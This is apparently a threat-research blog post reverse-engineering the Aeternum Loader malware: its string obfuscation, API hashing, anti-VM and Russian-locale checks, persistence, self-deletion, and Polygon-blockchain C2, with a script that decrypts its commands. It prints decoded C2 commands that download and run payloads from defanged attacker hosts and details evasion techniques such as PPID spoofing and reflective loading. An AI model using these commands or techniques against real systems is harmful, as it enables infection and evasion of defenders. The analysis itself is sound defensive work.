---
title: "Aeternum Loader: Inside the binary"
classes: wide
header:
  teaser: /assets/images/block/logo2.png
ribbon: black
description: "Our attempt at reversing Aeternum Loader to extract contract addresses and reveal functionality."
categories:
  - Threat Research
tags:
  - Threat Research
toc: true
---

# Aeternum Loader Analysis

In our first post, we showed how Aeternum's operator panel and a flawed encryption scheme let us decrypt C2 commands straight from the Polygon blockchain. This missing piece was the contract itself, which meant getting a real build and tearing it apart. 

In this post we:

* Obtain a build of Aeternum Loader
* Attempt to deal with obfuscation and anti-VM capabilities
* Extract hardcoded contract addresses
* Analyse features and capabilities of the loader   

## Getting a build

We posed as a potential buyer of Aeternum Loader, asking questions about the product and its features. Eventually I got a few test builds to run. The binary sent from `LenAI` was UPX packed, although this could be unpacked with a simple `upx -d`. The Aeternum Loader binary also uses multiple obfuscation and evasion techniques to hinder analysis, which we will discuss now.   

# String obfuscation

Aeternum Loader uses per-string XOR obfuscation using unique keys. The obfuscated bytes live within the binaries `.data` section, and are dynamically decrypted by each function that uses them. 

Within the IDA it was clear to spot where XOR decryption was occurring. You'd either see successive XOR operations or a loop iterating through the bytes performing XOR operations:

**Example 1**:

[![1](/assets/images/block/12.png)](/assets/images/block/12.png){: .full}  

In the above example, we've named the 4 bytes `byte_443A21` ... `byte_443A24` the "encrypted bytes" and `byte_443A26` ... `byte_443A29` the "key bytes". At runtime (guarded by a “decoded” flag so it only happens once), each function will recovers plaintext strings by XORing each encrypted byte with the corresponding key byte at the same index, overwriting the encrypted bytes: `enc[i] = enc[i] XOR key[i]`.

**Example 2**:

[![1](/assets/images/block/13.png)](/assets/images/block/13.png){: .full}   

This example is very similar, although we just observed a *for loop* that iterated through the decryption process of strings. In both of the above, it was possible to do manually - but it was tedious to do at scale. We wanted to somehow speed the process of extracting the strings.

[![1](/assets/images/block/14.png)](/assets/images/block/14.png){: .full}   

When examining the encrypted bytes and their corresponding keys in a hexdump, we noticed a consistent structure we could leverage. First, we established that each pair is the same length: `len(ENC_n) = len(KEY_n)`. We also observed that, in the raw binary, the data is laid out like:

```python
[...] 00 00 00 [ENC] 00 [KEY] 00 00 00 [ENC_1] 00 [KEY_1] 00 00 00 [...]
```

In other words, the encrypted bytes and key bytes (which are same length) are separated by a single null byte (`00`), which acts as a clear delimiter between the two. Surrounding each pair is a triple-null boundary (`00 00 00`): three null bytes appear immediately before the encrypted bytes and again immediately after the key bytes, effectively framing each ENC/KEY entry and making it straightforward to locate and carve consecutive pairs from the blob.

We can use an LLM to whip up a Python script that carves this pattern from the `.data` section, dumping raw strings, revealing some juicy information:

[![1](/assets/images/block/15.png)](/assets/images/block/15.png){: .full}   

Here we can see large lists of Polygon RPC URLs that would be used to make requests to the Smart Contract address hard-coded within the strings - `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`.

# Dynamic Windows API resolution

Aeternum Loader attempts to obfuscate imported some Win32 API functions via dynamic resolution. We observed the actor use API hashing, using multiple algorithms, to dynamically lookup function names rather than storing them in clear text. Notably, although API hashing is used to obfuscate some imports - the IAT table of Aeternum Loader was very noisy and imported multiple suspicious functions:

[![1](/assets/images/block/63.png)](/assets/images/block/63.png){: .full}    
[![1](/assets/images/block/64.png)](/assets/images/block/64.png){: .full}    

From the above we can see multiple suspicious imports which weren't obfuscated. For example, the PPID-spoofing capability uses dangerous unresolved Win32 APIs directly. We suspect this is likely the result of copying-pasting code from POCs without re-adjusting obfuscation, or related to AI-assisted development.    

## CRC32

The main API hashing algorithm works by loading the relevant module, which was `kernel32.dll` each time the function was called. The algorithm will then locate the DLLs export directory and iterate through this, computing a CRC32 hash of the function name:

[![1](/assets/images/block/16.png)](/assets/images/block/16.png){: .full}   

We can see this function is called multiple times, each time with a hash as the parameter:

[![1](/assets/images/block/17.png)](/assets/images/block/17.png){: .full}

It's possible to use a Python script to create the CRC32 hashing algorithm, and match the corresponding hashes:

```python
def api_crc32(s): # Function name as input
    c=0xFFFFFFFF
    for b in s.encode("ascii"):
        c^=b
        for _ in range(8):
            c=(c>>1)^(POLY if c&1 else 0)
            c&=0xFFFFFFFF
    return (~c)&0xFFFFFFFF
```   

This can speed up the process of resolving function names to hashes:

[![1](/assets/images/block/18.png)](/assets/images/block/18.png){: .full}

## DJB2

The loader has the ability to reflectively load payloads from memory. Within this capability, which we will get to later, we also observed DJB2 API hashing to obfuscate imported functions. Like before, we can recreate the algorithm within Python:

```python
def djb2_hash(function_name):
    hash_value = 112186
    for char in function_name:
        hash_value = ord(char) + 33 * hash_value
    return hash_value & 0xFFFFFFFF
``` 
[![1](/assets/images/block/30.png)](/assets/images/block/30.png){: .full}

Similarly, we can retrieve the relevant resolved function names:

[![1](/assets/images/block/31.png)](/assets/images/block/31.png){: .full}

# Anti-VM / Geofencing

Aeternum Loader implements a couple checks in order to detect whether the malware is being ran within a virtualised environment or from a Russian computer. 

## CPUID

The `cpuid` assembly instruction allows software to discover various details of the processor the machine is being executed on. `cpuid` instruction takes input value from the `EAX` register to determine what information to retrieve. ZScaler ThreatLabz [reported that HijackLoader](https://www.zscaler.com/blogs/security-research/analyzing-new-hijackloader-evasion-tactics) leveraged the `cpuid` instruction with `EAX=1`to determine whether the 31st bit of ECX set, which would indicate a hypervisor. 

[![1](/assets/images/block/52.png)](/assets/images/block/52.png){: .full}

Aeternum Loader calls `cpuid` with `EAX=6` - which refers to "Thermal and Power Management". This instruction outputs to the `EAX`, `ESI`, `ECX` & `EDX` registers.

[![1](/assets/images/block/54.png)](/assets/images/block/54.png){: .full}

If the first bit of `ECX` is 0, the function will quit, triggering the Anti-VM detection. Referencing the [Intel documentation](https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3b-part-2-manual.pdf), we can see `ECX (bit 0)` indicates the presence of `IA32_MPERF` and `IA32_APERF` Model Specific Registers (MSRs). 

[![1](/assets/images/block/53.png)](/assets/images/block/53.png){: .full}

`MPERF` / `APERF` are hardware MSRs for the hosts CPU - which might not be found on hypervisors/virtualised environments. If Aeternum Loader doesn't find these (as indicated by `ECX`), Anti-VM checks will fail.

Although both [GuLoader](https://outpost24.com/blog/playing-with-guloader-anti-vm-techniques-malware/) and HijackLoader have previously leveraged the `cpuid` instruction during Anti-VM detection, I couldn't find others reports of malware using `EAX=6` as the specific method for VM detection.  

## GetSystemFirmwareTable()

Aeternum Loader calls the function `GetSystemFirmwareTable()` with the parameter `RSMB` (Raw SMBIOS) in order to retrieve the host's SMBIOS firmware table. SMBIOS can expose hardware information through data embedded within the firmware. Once the table is retrieved, Aeternum Loader will walk the chain of SMBIOS structures searching for `Type 0 (BIOS Information)`:

[![1](/assets/images/block/57.png)](/assets/images/block/57.png){: .full}

When it finds `Type 0 (BIOS Information structure)`, it reads field at offset `0x0A`. Cross-referencing with the [SMBIOS spec](https://www.dmtf.org/sites/default/files/standards/documents/DSP0134_2.7.1.pdf) we can see this relates to the 64-bit "BIOS Characteristics" field:

[![1](/assets/images/block/55.png)](/assets/images/block/55.png){: .full}

Each bit within the "BIOS Characteristics" bitfield indicates a supported BIOS feature, such as ISA, Plug and Play, boot from CD, PCI, etc:

[![1](/assets/images/block/56.png)](/assets/images/block/56.png){: .full}

Aeternum Loader will count to total set bits for the 64-bit Characteristics bitfield. If fewer than 10 bits are set, then the loader treats the environment as a VM. This is because real physical hardware typically reports 15+ characteristic bits:

[![1](/assets/images/block/58.png)](/assets/images/block/58.png){: .full}

## USB activity

Aeternum Loader will open and enumerate registry key `SYSTEM\ControlSet001\Enum\USBSTOR`. This registry key records every USB storage device ever plugged in. Using `RegQueryInfoKeyW` Aeternum Loader counts the number of subkeys. If this is 0, meaning no storage devices have ever been plugged into the machine, Aeternum Loader will treat this as a VM, stopping execution. 

[![1](/assets/images/block/59.png)](/assets/images/block/59.png){: .full}

## Russian Users

Aeternum Loader will attempt to identify Russian users via functions `GetSystemDefaultLangID()` & `GetUserDefaultLangID()`. If either are equal to `1049`, or Russian, then the loader will not run:

[![1](/assets/images/block/60.png)](/assets/images/block/60.png){: .full}

Additionally, the registry key `HCKU\Control Panel\International\LocaleName` & function `GetLocaleInfoW()` are also both used to identify potential Russian users: 

[![1](/assets/images/block/61.png)](/assets/images/block/61.png){: .full}

Interestingly, doesn't appear to check for other common CIS/former-Soviet countries that malware often avoids. ErrTraffic, created by the Aeternum Loader developer, did have full CIS geofencing by default.

# Installation & Persistence

If Aeternum loader passes the Anti-VM and Russia geofencing checks, it'll begin an installation process to establish persistence. This involves using the Win32 resolved API function `GetModuleFileNameA()` to retrieve the full file path of the original binary. Aeternum Loader is then copied to `AppData\Local`, persisting via the Startup folder. 

| Type            | File Path                                                                                                            |
|-----------------|----------------------------------------------------------------------------------------------------------------------|
| Aeternum Loader | `C:\Users\[USER]\AppData\Local\wmi[HOST_ID]\wmi_[HOST_ID].exe`                                                       |
| Persistence     | `C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\[AUTORUN_NAME]wmi[HOST_ID].lnk` |

The "HOST_ID" strings are the MD5 hash of the `C:`-volume serial number. The above `.lnk` is attempting to persist the core Aeternum Loader module. Later, when we inspect the loader's capabilties - we'll observe dropped payloads also can be configured to persist via the Startup folder. 

In our sample, we saw the name `vs_api_update_services` that was appended with `wmi` and the host ID. This is the autorun `LenAI` told me to look for. 

**Installation:**

[![1](/assets/images/block/33.png)](/assets/images/block/33.png){: .full} 

**Persistence:**

[![1](/assets/images/block/34.png)](/assets/images/block/34.png){: .full}


## Self Deletion

Aeternum uses self-deletion technique that leverages NTFS Alternate Data Streams (ADS) to achieve anti-forensic objectives. The technique which first originated as a [POC on Github](https://github.com/LloydLabs/delete-self-poc) is now being used in malware to enable executables to delete themselves after execution, complicating incident response and forensic analysis efforts. 

The routine executes after the malware has completed its primary payload delivery, specifically after copying itself to a persistence location. To begin with, the malware retrieves its own executable path using `GetModuleFileNameW`. 

[![1](/assets/images/block/27.png)](/assets/images/block/27.png){: .full}

After that, the malware constructs a `FILE_RENAME_INFO` structure programmatically, encoding the target stream name character by character:

[![1](/assets/images/block/28.png)](/assets/images/block/28.png){: .full}

The rename operation creates NTFS journal entries showing the file was renamed to an ADS, but the original file content becomes inaccessible through normal file system traversal. Recovery of the malware binary becomes dependent on capturing process memory before termination, as the file system no longer contains the executable.

While any ADS name would work technically, this specific string `":wtfbbq"` has been seen before, leveraged via [Latrodectus](https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus) and [MuddyWater's StealthCache](https://www.group-ib.com/blog/muddywater-infrastructure-malware/).


# Command & Control

Once installed, it'll start the beaconing process in order to retrieve encrypted commands. Specifically, a Mersenne Twister-like PRNG is leveraged to create beacon jitter, with a random delay of 1 to 3 minutes. Aeternum Loader attempts to achieve redundancy using a hardcoded list of over [Polygon RPC domains](https://github.com/ctrlaltint3l/intelligence/blob/main/Aeternum%20Loader/PolygonRPC.txt).

## Polygon RPC for C2

The contract address, `0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0`, was XOR encrypted and used with the smart contract's `getDomain()` function export address `0xb68d1809` in order to retrieve C2 commands. `POST` requests were made to the C2 using the below parameters:

```
POST / HTTP/1.1
Host: <polygon-rpc-host>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json

{"jsonrpc":"2.0","method":"eth_call","params":[{"to":"0x4d70C3393C5d9EC325Edf8b3f289cFA9777e64B0","data":"0xb68d1809"},"latest"],"id":1}
```

This would return JSON, and within the `result` value is the encrypted command:

```
{"jsonrpc":"2.0","id":1,"result":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000ba363137383665353434373431333736343633326235353262366434313530343333613734363337313634333733363664373833383534333032623431363532623535326634363432363236643434343237313737363734343431353836643531373937383466333335333339363233353438353037343464353033393661343433303437346236363334363536333535353433323461356137343761343437353461373434373435363336333531373336613735363936663364000000000000"}
```

We can remove the padding and hex decode this twice to reveal the encrypted command:

[![1](/assets/images/block/35.png)](/assets/images/block/35.png){: .full}

## Decrypting C2 commands

The exposed data on the blockchain C2 is AES encrypted with a key derived from the contract address. This means you only need to know the contract address in order to decrypt all commands that have been sent to that particular "C2 server". We can use the below Python script to decrypt commands:

```python
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

def decrypt_command(contract_address, encrypted):
    iv_b64, ct_b64 = encrypted.split(":", 1) # Extract IV / ENC data

    iv = base64.b64decode(iv_b64)          # B64 decode IV 
    ciphertext = base64.b64decode(ct_b64)  # B64 decode ENC data

    
    addr = contract_address.lower().encode("utf-8")   
    kdf = PBKDF2HMAC(                             # Derive AES key from contract address
        algorithm=hashes.SHA256(), 
        length=32,            # 256 bits
        salt=addr,            # salt = contract address (same as password)
        iterations=100_000,
    )
    key = kdf.derive(addr)    # password = contract address


    aesgcm = AESGCM(key) 
    plaintext = aesgcm.decrypt(iv, ciphertext, None)  # AES decrypt


    return plaintext.decode("utf-8") #Plaintext command
```

We can do this at scale, I'll break down a few example commands we observed for this sample.

* `all:url:hXXps://rpc-framework-check[.]cfd/1.ps1` - Download and run PowerShell script `1.ps1` on all hosts
* `all:url:hXXps://github[.]com/ooocyber_bunerkdl/ttt/raw/refs/heads/main/123.exe` - Download and run `123.exe` on all hosts
* `hwid:fca8bdd1134497619285f4f9aba60817:url:hXXps://rpc-framework-check[.]cfd/123.exe` - Download and run `123.exe` on specific host 

# Loader

| Payload extension (from URL)      | Drop behavior                   | Notes                                                                                                             | Persistence behavior                                                       |
| --------------------------------- | ------------------------------- | ------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------- |
| `.dll`                        | **No drop** (reflective loading) | Manual-map/reflective-style load; resolves imports/relocs; calls `DllMain` or call a named export | N/A          |
| `.ps1`**                        |`%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW (`:Zone.Identifier` ADS deletion); PowerShell runs hidden with ExecutionPolicy bypass + NoProfile            | If enabled: Startup folder `.lnk` pointing to dropped script |
| `.cmd` / `.bat`               | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; runs via `cmd.exe`; PPID spoofing to `explorer.exe`                                                     | If enabled: Startup folder `.lnk` pointing to dropped script               |
| `.exe` + all other extensions | `%TEMP%\{RANDOM10}\{RANDOM10}.ps1`           | Removes MOTW; PPID spoofing to `explorer.exe`                                    | If enabled: Startup folder `.lnk` pointing to dropped file                 |


Aeternum Loader download payloads from the C2 using `InternetReadFile()` to read 8KB chunks to the buffer. These may be written to disk - given the file extension of the downloaded payload. The User-Agent `Mozilla/5.0` is used for these C2 requests:

[![1](/assets/images/block/62.png)](/assets/images/block/62.png){: .full}

## Reflective DLL Loading

If the Aeternum Loader is downloading a `.dll` payload, it will not write to disk, but rather reflectively load it within memory via Manual PE mapping.

Firstly, it checks whether the binary is a valid executable with "MZ" & "PE" header strings:

[![1](/assets/images/block/20.png)](/assets/images/block/20.png){: .full}

Then an area of memory is allocated with RWX permissions set to the size of the PE:

[![1](/assets/images/block/21.png)](/assets/images/block/21.png){: .full}

Since `VirtualAlloc` returns an arbitrary address, the code processes the relocation table and remaps to the correct entry point. But in order to actually run the DLL within memory, it needs to import it's relevant functions. As mentioned earlier, djb2 API hashing is used to resolve the functions for `LoadLibraryA`, `GetProcAddress` & `GetModuleHandleA`. These 3 functions are used to figure out the mapped PE's imports, then importing them dynamically. 

[![1](/assets/images/block/22.png)](/assets/images/block/22.png){: .full}

After loading relevant functions, the PE is executed:

[![1](/assets/images/block/23.png)](/assets/images/block/23.png){: .full}

## Writing payloads to disk

If the Aeternum Loader is **not** downloading a `.dll` payload (i.e. downloading `.exe`, `.ps1`, `.cmd`, `.bat` or other), it'll create a directory within `%TEMP%` with 10 random characters. Another 10 random characters are also chosen for the file name, and these are written to disk:

[![1](/assets/images/block/24.png)](/assets/images/block/24.png){: .full}

This will write the payload to disk in the directory `C:\Users\<username>\AppData\Local\Temp\[10 random chars]\[10 random chars].[ext]`. Following this, the Mark-Of-The-Web (MoTW) Alternate Data Stream (ADS), `Zone.Identifier`, will be deleted:

[![1](/assets/images/block/25.png)](/assets/images/block/25.png){: .full}

If the C2 command contains the argument `savestartupname`, it will also achieve persistence via an `.lnk` file, with the corresponding name.  

## Parent Process ID (PPID) Spoofing

All payloads that are written to disk are executed with PPID spoofing to make it appear malware is spawning from `explorer.exe`. The function does the following thing:

1. Enumerate running processes using `CreateToolhelp32Snapshot()` to identify `explorer.exe`

2. Open a handle to the parent using `OpenProcess(0x80, 0, CurrentProcesSId)` with parameter `0x80` -> `PROCESS_CREATE_PROCESS` 

3. Build `PROC_THREAD_ATTRIBUTE_LIST`

[![1](/assets/images/block/38.png)](/assets/images/block/38.png){: .full}

4. New process is spawned with spoofed parent, with dwCreationFlags `0x9080200` (`EXTENDED_STARTUPINFO_PRESENT`, `CREATE_NEW_PROCESS_GROUP` - required for PPID spoofing) & custom StartupInfo:

[![1](/assets/images/block/39.png)](/assets/images/block/39.png){: .full}

# Conclusion

Although threat actors might think leveraging the Blockchain for C2 communications comes with operational security benefits, we hope these blogs have demonstrated the weaknesses in using such methods. Firstly, the encrypted commands will exist forever on the Blockchain. For Defenders this is a great opportunity. If at any point in the future, the malware is reversed and encryption is cracked, this can provide a historical log of all commands ever sent. You unfortunately don't get this level of long-term visibility with standard C2 servers.  

